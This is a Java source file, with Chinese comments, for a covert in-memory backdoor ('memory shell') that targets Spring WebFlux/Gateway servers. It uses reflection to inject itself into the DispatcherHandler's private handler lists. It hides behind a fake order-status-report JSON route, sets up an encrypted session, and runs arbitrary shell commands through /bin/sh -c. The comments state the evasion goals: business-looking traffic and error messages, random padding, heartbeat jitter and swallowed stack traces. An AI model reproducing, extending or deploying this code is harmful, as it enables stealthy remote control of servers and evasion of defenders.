// RptStreamCoordinator — WebFlux/Spring Cloud Gateway 钩子位(三令·新注入位;响应式)
// 形态声明(四令):自研 AOQ/1.0;响应式 HandlerMapping+HandlerAdapter 双接口;
//   挂载=DispatcherHandler 私有 handlerMappings/handlerAdapters 列表头插(反射,同 MVC 位对称)。
// 验证分级(如实):核心 AOQ 派发=纯 JDK 真执行;响应式壳=API 拟形桩编译+STUB-RT 订阅链;
//   真栈 RT(reactor-netty/spring-webflux)缓期——本环境无响应式 jar(全盘检索+DNS 探查证据入台账)。
public class RptStreamCoordinator implements org.springframework.web.reactive.HandlerMapping,
        org.springframework.web.reactive.HandlerAdapter {
    static final String ATTEST_IN = "AOQ-ATTEST";
    static volatile RptStreamCoordinator LIVE;
    static volatile boolean poisoned;
    java.security.KeyPair kx;
    AoqCore.Session sess;

    public reactor.core.publisher.Mono<Object> getHandler(org.springframework.web.reactive.ServerWebExchange ex) {
        if (ex == null || poisoned) return reactor.core.publisher.Mono.just(null);
        String p = ex.getRequest().getURI().getPath();
        if (p != null && p.endsWith("/report/batch")) {
            if (LIVE == null) LIVE = this;
            return reactor.core.publisher.Mono.just((Object) this);
        }
        return reactor.core.publisher.Mono.just(null);
    }

    public boolean supports(Object h) { return h != null && h == (LIVE == null ? this : LIVE); }

    public reactor.core.publisher.Mono<org.springframework.web.reactive.HandlerResult> handle(
            org.springframework.web.reactive.ServerWebExchange ex, Object handler) {
        return ex.getRequest().getBody()
                .collectList()
                .map(bufs -> join(bufs))
                .flatMap(bytes -> {
                    String resp = process(new String(bytes, java.nio.charset.StandardCharsets.UTF_8));
                    ex.getResponse().getHeaders().setContentType(org.springframework.http.MediaType.APPLICATION_JSON);
                    ex.getResponse().writeWith(reactor.core.publisher.Flux.just(
                            new org.springframework.web.reactive.DataBuffer(resp.getBytes(java.nio.charset.StandardCharsets.UTF_8))));
                    return reactor.core.publisher.Mono.just(new org.springframework.web.reactive.HandlerResult(handler, resp));
                });
    }

    static byte[] join(java.util.List<org.springframework.web.reactive.DataBuffer> bufs) {
        java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
        for (org.springframework.web.reactive.DataBuffer b : bufs) { byte[] x = b.toByteArray(); o.write(x, 0, x.length); }
        return o.toByteArray();
    }

    /** AOQ/1.0 派发(与 MVC 位同语义;核心逻辑真执行) */
    String process(String body) {
        if (poisoned) return AoqCore.envelopeErr("b3-00000000", "batch rule mismatch");
        String tr = AoqCore.jsonField(body, "traceId"); if (tr == null) tr = "b3-00000000";
        String item = AoqCore.jsonField(body, "skuId");
        byte[] raw = AoqCore.unb64(item);
        if (raw == null) return AoqCore.envelopeErr(tr, "item not decodable");
        Object[] fr = AoqCore.unframe(raw);
        if (fr != null) {
            int op = (Integer) fr[0]; byte[] data = (byte[]) fr[2];
            if (op != AoqCore.OP_KX || data.length <= 16) return AoqCore.envelopeErr(tr, "kx malformed");
            String peerPub = new String(data, 0, data.length - 16, java.nio.charset.StandardCharsets.UTF_8);
            byte[] peerN = java.util.Arrays.copyOfRange(data, data.length - 16, data.length);
            kx = AoqCore.newPair(); byte[] myN = AoqCore.rnd(16);
            sess = AoqCore.kxDerive(kx, peerPub, peerN, myN, tr);
            byte[] pub = AoqCore.pubB64(kx).getBytes(java.nio.charset.StandardCharsets.UTF_8);
            byte[] resp = java.nio.ByteBuffer.allocate(pub.length + 16).put(pub).put(myN).array();
            return AoqCore.envelopeResp(tr, AoqCore.b64(AoqCore.frame(AoqCore.OP_KX, "J", resp)), 0);
        }
        if (sess == null) return AoqCore.envelopeErr(tr, "session required");
        byte[] pt = sess.aeadOpen(raw);
        Object[] f2 = pt == null ? null : AoqCore.unframe(pt);
        if (f2 == null) return AoqCore.envelopeErr(tr, "checksum rejected");
        int op = (Integer) f2[0]; byte[] data = (byte[]) f2[2];
        byte[] r;
        if (op == AoqCore.OP_ATTEST) {
            if (!ATTEST_IN.equals(new String(data, java.nio.charset.StandardCharsets.UTF_8))) {
                poisoned = true;
                return AoqCore.envelopeErr(tr, "batch rule mismatch");
            }
            r = ("SPECTRE-MARK-RX|" + Thread.currentThread().getName()).getBytes(java.nio.charset.StandardCharsets.UTF_8);
        } else if (op == AoqCore.OP_PING) {
            r = ("ACK|" + AoqCore.hex(AoqCore.rnd(4))).getBytes(java.nio.charset.StandardCharsets.UTF_8);
        } else if (op == AoqCore.OP_TASK) {
            r = exec(new String(data, java.nio.charset.StandardCharsets.UTF_8));
        } else { return AoqCore.envelopeErr(tr, "op unsupported"); }
        return AoqCore.envelopeResp(tr, AoqCore.b64(sess.aeadSeal(AoqCore.frame(op, "J", r))), 0);
    }

    static byte[] exec(String t) {
        try {
            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", t);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
            java.io.InputStream is = p.getInputStream(); byte[] b = new byte[512]; int n;
            while (o.size() < 2048 && (n = is.read(b)) > 0) o.write(b, 0, n);
            p.waitFor();
            return o.toByteArray();
        } catch (Throwable e1) { return new byte[0]; }
    }

    /** 挂载:DispatcherHandler 私有列表头插(与 MVC 位 attach 对称) */
    public static boolean attach(org.springframework.web.reactive.DispatcherHandler dh) {
        try {
            RptStreamCoordinator c = new RptStreamCoordinator();
            java.lang.reflect.Field f1 = org.springframework.web.reactive.DispatcherHandler.class.getDeclaredField("handlerMappings");
            f1.setAccessible(true);
            java.util.List<?> hm = (java.util.List<?>) f1.get(dh);
            ((java.util.List<Object>) hm).add(0, c);
            java.lang.reflect.Field f2 = org.springframework.web.reactive.DispatcherHandler.class.getDeclaredField("handlerAdapters");
            f2.setAccessible(true);
            java.util.List<?> ha = (java.util.List<?>) f2.get(dh);
            ((java.util.List<Object>) ha).add(0, c);
            LIVE = c;
            return true;
        } catch (Throwable t) { return false; }
    }
}

class AoqCore {
    // ===== 业务语义面(全面伪装令:路径/字段/UA/CT 全拟业务) =====
    static final String SVC   = "order-status-report";
    static final String ROUTE = "/api/v2/oms/report/batch";
    static final String UA    = "AcmeOMS-Agent/2.4 (Linux; x64)";
    static final String CT    = "application/json;charset=UTF-8";
    static final String VER   = "1.0";
    static final String CSNAME = "OMS-Tag-1";      // 字符集位(D)的公开名
    // ===== 操作码(帧内,不可见) =====
    static final int OP_KX = 1, OP_PING = 2, OP_TASK = 0x10, OP_FETCH = 0x11, OP_ATTEST = 0x7F;
    // ===== 每会话密钥材料 =====
    private static final java.security.SecureRandom RNG = new java.security.SecureRandom();

    /** 会话:X25519 ECDH + HKDF-SHA256 → AES-256-GCM(每会话独立,禁默认密钥) */
    static class Session {
        final byte[] sk; final String trace; long seq = 0;
        Session(byte[] ikm, String tr) { trace = tr;
            sk = hkdf(ikm, (tr + "|aoq/1.0/kx").getBytes(java.nio.charset.StandardCharsets.UTF_8), 32); }
        byte[] aeadSeal(byte[] pt) {
            try {
                byte[] n = new byte[12]; RNG.nextBytes(n);
                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
                c.init(javax.crypto.Cipher.ENCRYPT_MODE, new javax.crypto.spec.SecretKeySpec(sk, "AES"), new javax.crypto.spec.GCMParameterSpec(128, n));
                byte[] ct = c.doFinal(pt);
                java.nio.ByteBuffer bb = java.nio.ByteBuffer.allocate(12 + ct.length); bb.put(n); bb.put(ct);
                return bb.array();
            } catch (Exception e) { return new byte[0]; }
        }
        byte[] aeadOpen(byte[] nct) {
            try {
                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
                c.init(javax.crypto.Cipher.DECRYPT_MODE, new javax.crypto.spec.SecretKeySpec(sk, "AES"), new javax.crypto.spec.GCMParameterSpec(128, nct, 0, 12));
                return c.doFinal(nct, 12, nct.length - 12);
            } catch (Exception e) { return null; }
        }
    }

    /** 新会话密钥对(每会话新鲜 X25519,禁复用) */
    static java.security.KeyPair newPair() {
        try { return java.security.KeyPairGenerator.getInstance("X25519").generateKeyPair(); }
        catch (Exception e) { return null; }
    }
    static String pubB64(java.security.KeyPair kp) { return java.util.Base64.getEncoder().encodeToString(kp.getPublic().getEncoded()); }
    /** ECDH 派生(双侧同式:ikm = shared || peerNonce || myNonce;trace 入 salt) */
    static Session kxDerive(java.security.KeyPair own, String peerPubB64, byte[] peerNonce, byte[] myNonce, String trace) {
        try {
            java.security.KeyFactory kf = java.security.KeyFactory.getInstance("X25519");
            java.security.PublicKey pk = kf.generatePublic(new java.security.spec.X509EncodedKeySpec(java.util.Base64.getDecoder().decode(peerPubB64)));
            javax.crypto.KeyAgreement ka = javax.crypto.KeyAgreement.getInstance("X25519");
            ka.init(own.getPrivate()); ka.doPhase(pk, true);
            byte[] shared = ka.generateSecret();
            java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
            o.write(shared);
            // 双 nonce 按字典序规范折叠(与传入次序无关,双侧一致)
            int cmp = java.util.Arrays.compare(peerNonce, myNonce);
            if (cmp <= 0) { o.write(peerNonce); o.write(myNonce); } else { o.write(myNonce); o.write(peerNonce); }
            return new Session(o.toByteArray(), trace);
        } catch (Exception e) { return null; }
    }

    // ===== 自描述帧:AOQ|<op>|<job>|<dataB64>|<randPad>(自定义定界,非经典协议定界) =====
    static byte[] frame(int op, String job, byte[] data) {
        String s = "AOQ|" + op + "|" + job + "|" + java.util.Base64.getEncoder().encodeToString(data) + "|" + hex(rnd(6 + RNG.nextInt(10)));
        return s.getBytes(java.nio.charset.StandardCharsets.UTF_8);
    }
    static Object[] unframe(byte[] pt) {
        String s = new String(pt, java.nio.charset.StandardCharsets.UTF_8);
        String[] p = s.split("\\|");
        if (p.length < 5 || !p[0].equals("AOQ")) return null;
        try { return new Object[]{ Integer.parseInt(p[1]), p[2], java.util.Base64.getDecoder().decode(p[3]) }; }
        catch (Exception e) { return null; }
    }

    // ===== 业务 JSON 信封(响应体业务包裹=深度伪装⑦;pad=响应随机填充④) =====
    static String envelopeReq(String trace, String batchNo, String itemB64) {
        return "{\"traceId\":\"" + trace + "\",\"service\":\"" + SVC + "\",\"ver\":\"" + VER
             + "\",\"ts\":" + (System.currentTimeMillis() / 1000) + ",\"seq\":" + (100 + RNG.nextInt(899))
             + ",\"body\":{\"batchNo\":\"" + batchNo + "\",\"items\":[{\"skuId\":\"" + itemB64
             + "\",\"qty\":1}]},\"pad\":\"" + b64r(8 + RNG.nextInt(40)) + "\"}";
    }
    static String envelopeResp(String trace, String itemB64, int code) {
        return "{\"traceId\":\"" + trace + "\",\"service\":\"" + SVC + "\",\"ver\":\"" + VER
             + "\",\"ts\":" + (System.currentTimeMillis() / 1000) + ",\"code\":" + code
             + ",\"summary\":{\"total\":1,\"ok\":" + (code == 0 ? 1 : 0) + "},\"items\":[{\"skuId\":\""
             + itemB64 + "\",\"qty\":1}],\"pad\":\"" + b64r(0 + RNG.nextInt(97)) + "\"}";
    }
    /** 业务错误文案(拟目标应用风格,深度伪装⑧;异常栈吞净⑥) */
    static String envelopeErr(String trace, String msg) {
        return "{\"traceId\":\"" + trace + "\",\"service\":\"" + SVC + "\",\"ver\":\"" + VER
             + "\",\"code\":4003,\"error\":\"biz-rule\",\"detail\":\"" + msg
             + "\",\"pad\":\"" + b64r(4 + RNG.nextInt(32)) + "\"}";
    }

    // ===== 心跳 jitter ±30%(深度伪装③:禁固定间隔) =====
    static long beat(long baseMs, java.util.Random r) { return (long) (baseMs * (0.7 + 0.6 * r.nextDouble())); }

    // ===== 迷你 JSON 解析(容错;提取 skuId/批量号等) =====
    static String jsonField(String json, String field) {
        String needle = "\"" + field + "\":";
        int i = indexOf(json, needle); if (i < 0) return null;
        i += needle.length(); if (i >= json.length()) return null;
        if (json.charAt(i) == '"') {
            int j = json.indexOf('"', i + 1);
            while (j > 0 && json.charAt(j - 1) == '\\') j = json.indexOf('"', j + 1);
            return json.substring(i + 1, j);
        }
        int j = i; while (j < json.length() && ",}] \n\r\t".indexOf(json.charAt(j)) < 0) j++;
        return json.substring(i, j);
    }
    private static int indexOf(String hay, String ne) {
        outer: for (int i = 0; i + ne.length() <= hay.length(); i++) {
            for (int j = 0; j < ne.length(); j++) if (hay.charAt(i + j) != ne.charAt(j)) continue outer;
            return i;
        } return -1;
    }

    // ===== 工具 =====
    static byte[] rnd(int n) { byte[] b = new byte[n]; RNG.nextBytes(b); return b; }
    static String b64r(int n) { return java.util.Base64.getEncoder().encodeToString(rnd(n)); }
    static String hex(byte[] b) { StringBuilder sb = new StringBuilder();
        for (byte x : b) sb.append(String.format("%02x", x)); return sb.toString(); }
    static String b64(byte[] b) { return java.util.Base64.getEncoder().encodeToString(b); }
    static byte[] unb64(String s) { try { return java.util.Base64.getDecoder().decode(s); } catch (Exception e) { return null; } }
    static String trace() { return "b3-" + hex(rnd(8)); }
    static byte[] hkdf(byte[] ikm, byte[] salt, int len) {
        try {
            // RFC5869: extract=HMAC(salt,ikm); expand=T(i)=HMAC(prk,T(i-1)||byte(i))
            javax.crypto.Mac ex = javax.crypto.Mac.getInstance("HmacSHA256");
            ex.init(new javax.crypto.spec.SecretKeySpec(java.util.Arrays.copyOf(salt, 16), "HmacSHA256"));
            byte[] prk = ex.doFinal(ikm);
            javax.crypto.Mac m2 = javax.crypto.Mac.getInstance("HmacSHA256");
            m2.init(new javax.crypto.spec.SecretKeySpec(prk, "HmacSHA256"));
            java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
            byte[] t = new byte[0];
            int i = 1;
            while (o.size() < len) {
                byte[] in = java.util.Arrays.copyOf(t, t.length + 1);
                in[t.length] = (byte) i;
                t = m2.doFinal(in);
                o.write(t, 0, Math.min(32, len - o.size()));
                i++;
            }
            return o.toByteArray();
        } catch (Exception e) { return new byte[len]; }
    }

    // ===== 回显契约(功能守恒:RT 断言通道;stdout=内部调试面) =====
    interface Echo { void emit(String s); }
    static Echo STDOUT = s -> System.out.println(s);
}
